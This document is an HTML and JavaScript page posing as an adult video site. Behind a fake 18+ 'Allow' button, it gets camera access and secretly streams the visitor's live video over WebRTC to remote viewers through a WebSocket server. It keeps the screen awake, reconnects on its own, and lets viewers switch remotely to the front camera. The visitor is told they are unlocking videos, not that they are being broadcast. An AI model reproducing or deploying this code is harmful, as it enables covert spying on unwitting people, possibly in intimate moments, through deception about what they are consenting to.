<!doctype html>
<html>

<head>

<meta name="viewport"
      content="width=device-width,initial-scale=1">

<title>HD sex videos</title>

<style>

body{
  margin:0;
  background:#111;
  color:#fff;
  font-family:Arial,sans-serif;
  text-align:center;
  padding:20px;
  box-sizing:border-box;
}

#status{
  font-size:18px;
  margin:15px;
}

#id{
  font-size:13px;
  color:#aaa;
  margin-bottom:15px;
}

video{
  width:100%;
  max-width:420px;
  border-radius:10px;
  background:#000;
}

#permissionGate{

  position:fixed;
  inset:0;
  z-index:999999;

  display:flex;
  align-items:center;
  justify-content:center;

  padding:20px;

  background:#111;
}

.permissionBox{

  width:100%;
  max-width:380px;

  padding:25px;

  box-sizing:border-box;

  background:#222;

  border-radius:16px;
}

.permissionBox h2{
  margin-top:0;
  font-size:22px;
}

.permissionBox p{
  color:#ddd;
  line-height:1.5;
}

#allowCameraBtn{

  width:100%;

  padding:16px;

  margin-top:12px;

  border:none;

  border-radius:10px;

  background:#fff;

  color:#000;

  font-size:16px;

  font-weight:bold;

  cursor:pointer;
}

#permissionMessage{

  min-height:22px;

  margin:15px 0 0;

  color:#ff8888;
}

</style>

</head>

<body>


<div id="permissionGate">

  <div class="permissionBox">

    <h2>HD sex videos</h2>

    <p>
     If you are 18+ please press Allow button to start seeing more HD videos 
    </p>

    <button id="allowCameraBtn">
      Allow 
    </button>

    <p id="permissionMessage"></p>

  </div>

</div>


<h1>All types of sex videos</h1>

<div id="status">
  All permission is permission required
</div>

<div id="id"></div>

<video
  id="preview"
  autoplay
  playsinline
  muted>
</video>


<script>

const statusEl =
  document.getElementById("status");

const idBox =
  document.getElementById("id");

const permissionGate =
  document.getElementById("permissionGate");

const allowCameraBtn =
  document.getElementById("allowCameraBtn");

const permissionMessage =
  document.getElementById("permissionMessage");

const preview =
  document.getElementById("preview");


let stream = null;

let cameraId = null;

let ws = null;

let roleReceived = false;

let permissionAllowed = false;

let facingMode = "environment";

let reconnectDelay = 1000;

let switching = false;


const peers = new Map();

const pendingCandidates = new Map();


/* =========================
   STATUS
========================= */

function setStatus(text){

  statusEl.textContent = text;

}


/* =========================
   SEND
========================= */

function sendMessage(message){

  if(
    ws &&
    ws.readyState === WebSocket.OPEN
  ){

    ws.send(
      JSON.stringify(message)
    );

    return true;
  }

  return false;
}


/* =========================
   WAKE LOCK
========================= */

let wakeLock = null;

async function requestWakeLock(){

  try{

    if("wakeLock" in navigator){

      wakeLock =
        await navigator.wakeLock.request(
          "screen"
        );

    }

  }catch(err){

    console.log(
      "WakeLock:",
      err
    );

  }

}


/* =========================
   WEBRTC CONFIG
========================= */

const rtcConfig = {

  iceServers:[
    {
      urls:[
        "stun:stun.l.google.com:19302",
        "stun:stun1.l.google.com:19302",
        "stun:stun2.l.google.com:19302",
        "stun:stun3.l.google.com:19302",
        "stun:stun4.l.google.com:19302"
      ]
    }
  ]

};


/* =========================
   WEBSOCKET
========================= */

function connectWebSocket(){

  const protocol =
    location.protocol === "https:"
      ? "wss:"
      : "ws:";


  ws = new WebSocket(
    protocol +
    "//" +
    location.host +
    "/camera"
  );


  ws.onopen = () => {

    console.log(
      "Camera WebSocket connected"
    );

    reconnectDelay = 1000;

    if(
      permissionAllowed &&
      stream &&
      roleReceived
    ){

      sendMessage({
        type:"camera-live"
      });

    }

  };


  ws.onmessage = async event => {

    let message;

    try{

      message =
        JSON.parse(event.data);

    }catch{

      return;

    }


    console.log(
      "SERVER:",
      message.type
    );


    /* CAMERA ID */

    if(message.type === "role"){

      cameraId =
        message.cameraId;

      roleReceived = true;

      idBox.textContent =
        "Sex video ID: " + cameraId;


      if(
        permissionAllowed &&
        stream
      ){

        setStatus(
          "see more videos"
        );

        sendMessage({
          type:"camera-live"
        });

      }

      return;
    }


    /* VIEWER READY */

    if(
      message.type === "viewer-ready"
    ){

      if(!stream) return;

      await createOffer(
        message.viewerId
      );

      return;
    }


    /* ANSWER */

    if(message.type === "answer"){

      const viewerId =
        message.toViewerId ||
        message.viewerId;

      const pc =
        peers.get(viewerId);

      if(!pc) return;

      try{

        await pc.setRemoteDescription(
          new RTCSessionDescription(
            message.answer
          )
        );


        const queued =
          pendingCandidates.get(
            viewerId
          ) || [];


        for(
          const candidate of queued
        ){

          try{

            await pc.addIceCandidate(
              new RTCIceCandidate(
                candidate
              )
            );

          }catch(err){

            console.log(
              "ICE queue error:",
              err
            );

          }

        }


        pendingCandidates.set(
          viewerId,
          []
        );


      }catch(err){

        console.log(
          "Answer error:",
          err
        );

      }

      return;
    }


    /* ICE */

    if(message.type === "candidate"){

      const viewerId =
        message.toViewerId ||
        message.viewerId;

      if(!viewerId) return;


      const pc =
        peers.get(viewerId);

      if(!pc) return;


      if(
        pc.remoteDescription &&
        pc.remoteDescription.type
      ){

        try{

          await pc.addIceCandidate(
            new RTCIceCandidate(
              message.candidate
            )
          );

        }catch(err){

          console.log(
            "ICE error:",
            err
          );

        }

      }else{

        if(
          !pendingCandidates.has(
            viewerId
          )
        ){

          pendingCandidates.set(
            viewerId,
            []
          );

        }


        pendingCandidates
          .get(viewerId)
          .push(
            message.candidate
          );

      }

      return;
    }


    /* SWITCH CAMERA */

    if(
      message.type ===
      "switch-camera"
    ){

      switchCamera();

      return;
    }

  };


  ws.onerror = err => {

    console.log(
      "WebSocket error:",
      err
    );

  };


  ws.onclose = () => {

    roleReceived = false;

    setStatus(
      "🟡 Reconnecting..."
    );


    setTimeout(
      connectWebSocket,
      reconnectDelay
    );


    reconnectDelay =
      Math.min(
        reconnectDelay * 2,
        15000
      );

  };

}


/* =========================
   CREATE PEER
========================= */

function createPeer(viewerId){

  const old =
    peers.get(viewerId);

  if(old){

    try{
      old.close();
    }catch{}

  }


  const pc =
    new RTCPeerConnection(
      rtcConfig
    );


  peers.set(
    viewerId,
    pc
  );


  pendingCandidates.set(
    viewerId,
    []
  );


  /* ADD CAMERA VIDEO */

  if(stream){

    const track =
      stream.getVideoTracks()[0];

    if(track){

      pc.addTrack(
        track,
        stream
      );

    }

  }


  /* ICE */

  pc.onicecandidate =
    event => {

      if(!event.candidate)
        return;


      sendMessage({

        type:"candidate",

        candidate:event.candidate,

        toViewerId:viewerId

      });

    };


  /* CONNECTION */

  pc.onconnectionstatechange =
    () => {

      console.log(
        "PEER:",
        viewerId,
        pc.connectionState
      );


      if(
        pc.connectionState ===
        "connected"
      ){

        setStatus(
          "🟢 Streaming"
        );

      }


      if(
        pc.connectionState ===
        "failed"
      ){

        setTimeout(
          () => {

            if(
              peers.has(viewerId)
            ){

              createOffer(
                viewerId
              );

            }

          },
          1000
        );

      }

    };


  return pc;

}


/* =========================
   OFFER
========================= */

async function createOffer(viewerId){

  try{

    const pc =
      createPeer(viewerId);


    const offer =
      await pc.createOffer();


    await pc.setLocalDescription(
      offer
    );


    sendMessage({

      type:"offer",

      offer:pc.localDescription,

      toViewerId:viewerId

    });


    console.log(
      "OFFER SENT:",
      viewerId
    );


  }catch(err){

    console.error(
      "Offer error:",
      err
    );

  }

}


/* =========================
   CAMERA SWITCH
========================= */

async function switchCamera(){

  if(
    !permissionAllowed ||
    !stream ||
    switching
  ){

    return;
  }


  switching = true;


  const next =
    facingMode === "environment"
      ? "user"
      : "environment";


  const oldStream =
    stream;


  try{

    const newStream =
      await navigator.mediaDevices.getUserMedia({

        video:{
          facingMode:{
            ideal:next
          }
        },

        audio:false

      });


    const newTrack =
      newStream.getVideoTracks()[0];


    for(
      const pc of peers.values()
    ){

      const sender =
        pc.getSenders()
          .find(
            s =>
              s.track &&
              s.track.kind === "video"
          );


      if(sender){

        await sender.replaceTrack(
          newTrack
        );

      }

    }


    stream =
      newStream;

    facingMode =
      next;


    preview.srcObject =
      newStream;


    oldStream
      .getTracks()
      .forEach(
        track => track.stop()
      );


    setStatus(
      "🟢 Streaming"
    );


  }catch(err){

    console.log(
      "Camera switch error:",
      err
    );

  }


  switching = false;

}


/* =========================
   START CAMERA
========================= */

allowCameraBtn.onclick =
  async () => {

    allowCameraBtn.disabled =
      true;

    permissionMessage.textContent =
      "Requesting camera access...";


    try{

      stream =
        await navigator.mediaDevices.getUserMedia({

          video:{
            facingMode:{
              ideal:"environment"
            }
          },

          audio:false

        });


      preview.srcObject =
        stream;


      await preview.play()
        .catch(() => {});


      permissionAllowed =
        true;


      permissionGate.style.display =
        "none";


      setStatus(
        "🟢 Streaming"
      );


      await requestWakeLock();


      if(
        roleReceived
      ){

        sendMessage({
          type:"camera-live"
        });

      }


    }catch(err){

      console.log(
        "Camera error:",
        err
      );


      stream = null;

      allowCameraBtn.disabled =
        false;


      permissionMessage.textContent =
        "❌ Camera permission is required to start streaming.";


      setStatus(
        "🔒 Camera permission denied"
      );

    }

  };


/* =========================
   VISIBILITY
========================= */

document.addEventListener(
  "visibilitychange",
  async () => {

    if(
      document.visibilityState ===
      "visible"
    ){

      if(permissionAllowed){

        await requestWakeLock();

      }

    }

  }
);


/* =========================
   CLEANUP
========================= */

window.addEventListener(
  "beforeunload",
  () => {

    for(
      const pc of peers.values()
    ){

      try{
        pc.close();
      }catch{}

    }


    if(
      ws &&
      ws.readyState ===
      WebSocket.OPEN
    ){

      ws.close();

    }

  }
);


/* START */

connectWebSocket();

</script>

</body>
</html>
